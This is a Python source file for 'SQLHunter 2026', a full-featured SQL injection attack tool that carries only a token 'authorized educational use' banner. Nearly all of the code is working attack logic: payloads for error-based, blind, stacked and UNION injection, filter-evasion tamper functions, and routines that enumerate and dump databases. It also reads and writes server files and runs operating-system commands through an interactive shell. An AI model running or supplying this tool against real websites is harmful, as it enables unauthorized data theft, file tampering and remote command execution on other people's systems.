#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLHunter 2026 Advanced Edition - Full-Featured SQL Injection Tool
Educational Purpose Only - Use on Authorized Systems
"""

import requests
import sys
import time
import re
import random
import argparse
import json
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

# ANSI Colors
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'

def print_banner():
    print(f"""
{Colors.CYAN}{Colors.BOLD}
  ███████╗ ██████╗ ██╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██║     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  ███████╗██║   ██║██║     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
  ╚════██║██║▄▄ ██║██║     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ███████║╚██████╔╝███████╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.YELLOW}{Colors.BOLD}  SQLHunter 2026 Advanced - Ultimate Edition{Colors.RESET}
{Colors.RED}  [!] For authorized educational use only{Colors.RESET}
""")

def log_info(msg): print(f"{Colors.BLUE}[*]{Colors.RESET} {msg}")
def log_success(msg): print(f"{Colors.GREEN}[✓]{Colors.RESET} {msg}")
def log_error(msg): print(f"{Colors.RED}[✗]{Colors.RESET} {msg}")
def log_warning(msg): print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")
def log_payload(msg): print(f"{Colors.PURPLE}[>]{Colors.RESET} {msg}")

# Configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Version/17.0"
]
TIMEOUT = 15
DELAY = 0.2
OUTPUT_DIR = "SQLHunter_Reports"
os.makedirs(OUTPUT_DIR, exist_ok=True)

def rand_agent(): return random.choice(USER_AGENTS)

def make_request(url, method="GET", data=None, headers=None):
    if headers is None: headers = {"User-Agent": rand_agent(), "Accept": "*/*"}
    for _ in range(3):
        try:
            if method.upper() == "GET":
                resp = requests.get(url, headers=headers, timeout=TIMEOUT, allow_redirects=False)
            else:
                resp = requests.post(url, data=data, headers=headers, timeout=TIMEOUT, allow_redirects=False)
            return resp
        except: time.sleep(1)
    return None

# Tamper Scripts
def tamper_space2comment(payload): return payload.replace(" ", "/**/")
def tamper_random_case(payload): return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
def tamper_hex_encode(payload): return payload.replace("'", "0x27").replace('"', "0x22")
def tamper_double_encode(payload): return quote(quote(payload))

TAMPERS = {
    "space2comment": tamper_space2comment,
    "random_case": tamper_random_case,
    "hex_encode": tamper_hex_encode,
    "double_encode": tamper_double_encode
}

# Main SQLHunter Class
class SQLHunter:
    def __init__(self, url, param, method="GET", data=None, tamper=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data = data
        self.tamper = tamper
        self.vulnerable = False
        self.technique = None
        self.col_count = 0
        self.visible_col = 0
        self.orig_value = self._get_original_value()
        self.base_resp = self._send(self.orig_value)
        self.base_len = len(self.base_resp.text) if self.base_resp else 0
        self.baseline_time = self._measure_baseline()

    def _get_original_value(self):
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            return params.get(self.param, ['1'])[0]
        else:
            if isinstance(self.data, str):
                try:
                    d = dict(parse_qs(self.data))
                    return d.get(self.param, ['1'])[0]
                except: return '1'
            elif isinstance(self.data, dict): return str(self.data.get(self.param, '1'))
            return '1'

    def _apply_tamper(self, payload):
        if self.tamper and self.tamper in TAMPERS: return TAMPERS[self.tamper](payload)
        return payload

    def _build_payload(self, injection): return self.orig_value + injection

    def _send(self, injection, use_tamper=True):
        payload = self._build_payload(injection)
        if use_tamper and self.tamper: payload = self._apply_tamper(payload)
        log_payload(payload[:90])
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            params[self.param] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            return make_request(test_url, "GET")
        else:
            new_data = self.data.copy() if isinstance(self.data, dict) else self.data
            if isinstance(new_data, dict): new_data[self.param] = payload
            return make_request(self.url, "POST", data=new_data)

    def _measure_baseline(self):
        times = []
        for _ in range(3):
            start = time.time()
            self._send(self.orig_value, use_tamper=False)
            times.append(time.time() - start)
            time.sleep(0.2)
        return sum(times) / len(times)

    # Detection Methods
    def detect_error_based(self):
        log_info("Testing Error-based SQLi...")
        payloads = ["'", "\"", "')", "\")", "' OR '1'='1"]
        errors = [r"sql syntax", r"mysql_fetch", r"unclosed quotation mark",
                  r"odbc driver", r"jdbc driver", r"sqlite3.OperationalError",
                  r"pg_query()", r"warning.*mysql", r"syntax error"]
        for pl in payloads:
            resp = self._send(pl)
            if resp:
                content = resp.text.lower()
                for err in errors:
                    if re.search(err, content):
                        log_success(f"Error-based with: {pl}")
                        self.technique = "Error-based"
                        self.vulnerable = True
                        return True
                if resp.status_code == 500:
                    log_success(f"Error-based (500) with: {pl}")
                    self.technique = "Error-based"
                    self.vulnerable = True
                    return True
            time.sleep(DELAY)
        return False

    def detect_boolean_blind(self):
        log_info("Testing Boolean-based blind...")
        true_pl = " AND 1=1-- -"
        false_pl = " AND 1=2-- -"
        resp_true = self._send(true_pl)
        resp_false = self._send(false_pl)
        if resp_true and resp_false:
            if abs(len(resp_true.text) - len(resp_false.text)) > 50:
                log_success("Boolean blind detected.")
                self.technique = "Boolean-based blind"
                self.vulnerable = True
                return True
        return False

    def detect_time_blind(self):
        log_info("Testing Time-based blind...")
        payloads = [" AND SLEEP(3)-- -", "' AND SLEEP(3)-- -", '" AND SLEEP(3)-- -']
        for pl in payloads:
            start = time.time()
            self._send(pl)
            elapsed = time.time() - start
            if elapsed > 2.5:
                log_success(f"Time blind ({elapsed:.2f}s) with: {pl}")
                self.technique = "Time-based blind"
                self.vulnerable = True
                return True
            time.sleep(DELAY)
        return False

    def detect_stacked_queries(self):
        log_info("Testing Stacked queries...")
        pl = "; SELECT SLEEP(1)-- -"
        start = time.time()
        self._send(pl)
        if time.time() - start > 0.8:
            log_success("Stacked queries possible.")
            self.technique = "Stacked queries"
            self.vulnerable = True
            return True
        return False

    def detect_union(self):
        log_info("Testing UNION-based...")
        for i in range(1, 30):
            pl = f" ORDER BY {i}-- -"
            resp = self._send(pl)
            if resp and resp.status_code == 500:
                self.col_count = i - 1
                break
            time.sleep(DELAY)
        if self.col_count == 0: return False
        log_info(f"Columns: {self.col_count}")
        for i in range(1, self.col_count+1):
            nulls = ["NULL"] * self.col_count
            nulls[i-1] = "'SQLHUNTER'"
            pl = f" UNION SELECT {','.join(nulls)}-- -"
            resp = self._send(pl)
            if resp and "SQLHUNTER" in resp.text:
                self.visible_col = i
                log_success(f"UNION visible column {i}")
                self.technique = "UNION query"
                self.vulnerable = True
                return True
            time.sleep(DELAY)
        return False

    def run_detection(self):
        for tech in [self.detect_error_based, self.detect_boolean_blind,
                     self.detect_time_blind, self.detect_stacked_queries, self.detect_union]:
            if tech(): return True
        log_error("No vulnerability found.")
        return False

    # UNION Exploitation
    def union_query(self, query):
        if not self.visible_col: return None
        nulls = ["NULL"] * self.col_count
        nulls[self.visible_col-1] = f"CONCAT(0x53514c48554e544552,({query}),0x53514c48554e544552)"
        pl = f" UNION SELECT {','.join(nulls)}-- -"
        resp = self._send(pl)
        if resp:
            match = re.search(r'SQLHUNTER(.*?)SQLHUNTER', resp.text, re.DOTALL)
            if match: return match.group(1)
        return None

    def get_databases(self):
        dbs = []
        for i in range(100):
            db = self.union_query(f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {i}")
            if db: dbs.append(db)
            else: break
            time.sleep(DELAY)
        return dbs

    def get_tables(self, db):
        tables = []
        for i in range(100):
            t = self.union_query(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT 1 OFFSET {i}")
            if t: tables.append(t)
            else: break
            time.sleep(DELAY)
        return tables

    def get_columns(self, db, table):
        cols = []
        for i in range(100):
            c = self.union_query(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' LIMIT 1 OFFSET {i}")
            if c: cols.append(c)
            else: break
            time.sleep(DELAY)
        return cols

    def dump_table(self, db, table, columns):
        rows = []
        concat_cols = ",".join([f"IFNULL({c},'NULL')" for c in columns])
        for i in range(100):
            row = self.union_query(f"SELECT CONCAT_WS('|',{concat_cols}) FROM {db}.{table} LIMIT 1 OFFSET {i}")
            if row: rows.append(row.split('|'))
            else: break
            time.sleep(DELAY)
        return rows

    def read_file(self, filepath):
        return self.union_query(f"SELECT LOAD_FILE('{filepath}')")

    def write_file(self, filepath, content):
        hex_content = content.encode().hex()
        self.union_query(f"SELECT 0x{hex_content} INTO DUMPFILE '{filepath}'")
        log_warning(f"Write attempt to {filepath}")

    def execute_command(self, cmd):
        res = self.union_query(f"SELECT sys_exec('{cmd}')")
        if res: return res
        return self.union_query(f"SELECT do_system('{cmd}')")

    # Boolean Blind Extraction
    def _blind_bool_true(self, condition):
        pl = f" AND ({condition})-- -"
        resp = self._send(pl, use_tamper=False)
        return resp and len(resp.text) == self.base_len

    def _blind_time_true(self, condition):
        pl = f" AND IF(({condition}), SLEEP(2), 0)-- -"
        start = time.time()
        self._send(pl, use_tamper=False)
        return (time.time() - start) > (self.baseline_time + 1.5)

    def blind_extract_string(self, query, technique="boolean", max_len=50):
        if technique == "boolean":
            check = self._blind_bool_true
        else:
            check = self._blind_time_true
        
        # Get length
        length = 0
        for l in range(1, max_len+1):
            if check(f"LENGTH(({query}))={l}"):
                length = l
                break
            time.sleep(DELAY)
        if length == 0: return ""
        log_info(f"Length: {length}")
        
        result = ""
        for pos in range(1, length+1):
            low, high = 32, 126
            while low < high:
                mid = (low + high + 1) // 2
                if check(f"ASCII(SUBSTRING(({query}),{pos},1))>={mid}"):
                    low = mid
                else:
                    high = mid - 1
                time.sleep(DELAY/2)
            result += chr(low)
            sys.stdout.write(f"\r{Colors.CYAN}Blind:{Colors.RESET} {result.ljust(length, '.')}")
            sys.stdout.flush()
        print()
        return result

    def blind_get_databases(self, technique="boolean"):
        dbs = []
        for i in range(10):
            db = self.blind_extract_string(f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {i}", technique, 20)
            if db: dbs.append(db)
            else: break
        return dbs

    def blind_get_tables(self, db, technique="boolean"):
        tables = []
        for i in range(50):
            t = self.blind_extract_string(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT 1 OFFSET {i}", technique, 30)
            if t: tables.append(t)
            else: break
        return tables

    def blind_get_columns(self, db, table, technique="boolean"):
        cols = []
        for i in range(50):
            c = self.blind_extract_string(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' LIMIT 1 OFFSET {i}", technique, 30)
            if c: cols.append(c)
            else: break
        return cols

    def blind_dump_column(self, db, table, column, technique="boolean", limit=20):
        data = []
        for i in range(limit):
            val = self.blind_extract_string(f"SELECT {column} FROM {db}.{table} LIMIT 1 OFFSET {i}", technique, 100)
            if val: data.append(val)
            else: break
        return data

# Interactive Shell
def interactive_shell(hunter):
    technique = "time" if hunter.technique == "Time-based blind" else "boolean"
    while True:
        print(f"""
{Colors.CYAN}{'='*50}{Colors.RESET}
{Colors.BOLD}SQLHunter Interactive Shell{Colors.RESET}
{Colors.GREEN}Technique: {hunter.technique}{Colors.RESET}
1. Enumerate databases
2. Enumerate tables
3. Enumerate columns
4. Dump column data
5. Custom query
6. File read (UNION)
7. File write (UNION)
8. OS command (UNION)
9. Switch technique
0. Exit
""")
        choice = input(f"{Colors.YELLOW}> {Colors.RESET}").strip()
        
        if choice == "1":
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                dbs = hunter.get_databases()
            else:
                dbs = hunter.blind_get_databases(technique)
            for d in dbs: print(f"  {d}")
        
        elif choice == "2":
            db = input("Database: ").strip()
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                tables = hunter.get_tables(db)
            else:
                tables = hunter.blind_get_tables(db, technique)
            for t in tables: print(f"  {t}")
        
        elif choice == "3":
            db = input("Database: ").strip()
            table = input("Table: ").strip()
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                cols = hunter.get_columns(db, table)
            else:
                cols = hunter.blind_get_columns(db, table, technique)
            for c in cols: print(f"  {c}")
        
        elif choice == "4":
            db = input("Database: ").strip()
            table = input("Table: ").strip()
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                cols = hunter.get_columns(db, table)
                if cols:
                    data = hunter.dump_table(db, table, cols)
                    for row in data: print(" | ".join(row))
            else:
                cols = hunter.blind_get_columns(db, table, technique)
                if cols:
                    col = input(f"Column ({', '.join(cols)}): ").strip()
                    data = hunter.blind_dump_column(db, table, col, technique)
                    for val in data: print(f"  {val}")
        
        elif choice == "5":
            query = input("Query: ").strip()
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                result = hunter.union_query(query)
            else:
                result = hunter.blind_extract_string(query, technique)
            print(f"Result: {result}")
        
        elif choice == "6":
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                path = input("File path: ").strip()
                content = hunter.read_file(path)
                if content: print(content)
                else: log_error("Failed or no privilege.")
            else: log_error("Requires UNION technique.")
        
        elif choice == "7":
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                path = input("Destination path: ").strip()
                content = input("Content: ").strip()
                hunter.write_file(path, content)
            else: log_error("Requires UNION technique.")
        
        elif choice == "8":
            if hunter.technique in ["UNION query", "Error-based"] and hunter.visible_col:
                cmd = input("Command: ").strip()
                out = hunter.execute_command(cmd)
                if out: print(out)
                else: log_error("No output or sys_exec missing.")
            else: log_error("Requires UNION technique.")
        
        elif choice == "9":
            technique = "time" if technique == "boolean" else "boolean"
            log_info(f"Switched to {technique}-based extraction.")
        
        elif choice == "0":
            break
        
        else:
            log_error("Invalid choice.")

# Main
def main():
    parser = argparse.ArgumentParser(description="SQLHunter 2026 Advanced")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", help="Parameter to test")
    parser.add_argument("--data", help="POST data")
    parser.add_argument("--tamper", choices=TAMPERS.keys(), help="Tamper script")
    parser.add_argument("--dump", action="store_true", help="Auto-dump via UNION")
    parser.add_argument("--file-read", help="Read file (UNION)")
    parser.add_argument("--file-write", nargs=2, metavar=('PATH', 'CONTENT'), help="Write file")
    parser.add_argument("--os-shell", action="store_true", help="Interactive OS shell")
    args = parser.parse_args()

    if not args.url.startswith("http"): args.url = "http://" + args.url
    print_banner()

    params = []
    if args.param: params.append(args.param)
    elif args.data:
        try: params = list(parse_qs(args.data).keys())
        except: log_error("Invalid POST data"); sys.exit(1)
    else: params = list(parse_qs(urlparse(args.url).query).keys())

    if not params: log_error("No parameters found."); sys.exit(1)

    for param in params:
        log_info(f"Testing parameter '{param}'")
        hunter = SQLHunter(args.url, param, method="POST" if args.data else "GET", data=args.data, tamper=args.tamper)
        if not hunter.run_detection(): continue
        
        log_success(f"Vulnerable! Technique: {hunter.technique}")

        if args.file_read and hunter.technique in ["UNION query","Error-based"]:
            content = hunter.read_file(args.file_read)
            if content: print(f"\n{content}")
        if args.file_write and hunter.technique in ["UNION query","Error-based"]:
            hunter.write_file(args.file_write[0], args.file_write[1])
        if args.os_shell and hunter.technique in ["UNION query","Error-based"]:
            print(f"{Colors.RED}OS Shell (type exit to quit){Colors.RESET}")
            while True:
                cmd = input("os-shell> ").strip()
                if cmd.lower() in ("exit","quit"): break
                out = hunter.execute_command(cmd)
                if out: print(out)
        if args.dump and hunter.technique in ["UNION query","Error-based"]:
            dbs = hunter.get_databases()
            if dbs:
                db = dbs[0]
                tables = hunter.get_tables(db)
                for t in tables[:3]:
                    cols = hunter.get_columns(db, t)
                    data = hunter.dump_table(db, t, cols)
                    print(f"\n[Table: {t}]")
                    for row in data: print(" | ".join(row))

        interactive_shell(hunter)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted{Colors.RESET}")
        sys.exit(0)